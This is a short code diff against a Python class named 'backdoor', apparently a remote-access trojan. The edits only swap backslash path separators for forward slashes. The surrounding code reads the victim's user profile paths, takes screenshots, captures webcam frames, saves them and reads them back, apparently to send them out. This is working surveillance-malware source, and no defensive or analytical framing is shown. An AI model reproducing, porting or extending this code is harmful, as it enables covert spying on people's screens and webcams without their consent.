@@ -27,7 +27,7 @@ class backdoor:
         APPDATA = os.environ["APPDATA"]
         USER_PROFILE = os.environ["USERPROFILE"]
 
-        UPLOADING_SFX_PATH = USER_PROFILE + "\\Music.wav"
+        UPLOADING_SFX_PATH = USER_PROFILE + "/Music.wav"
 
         tm_enabled = True
     except Exception:
@@ -188,7 +188,7 @@ class backdoor:
             current_time = datetime.datetime.now()
             screenshot = ImageGrab.grab()
 
-            path = "{}\\Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
+            path = "{}/Screenshot{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
             screenshot.save(path)
 
             data = self.read_file(path)
@@ -204,7 +204,7 @@ class backdoor:
             ret, frame = cam.read()
 
             current_time = datetime.datetime.now()
-            path = "{}\\Webcam{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
+            path = "{}/Webcam{}{}{}.png".format(self.USER_PROFILE, current_time.year, current_time.month, current_time.day)
 
             cv2.imwrite(path, frame)
 
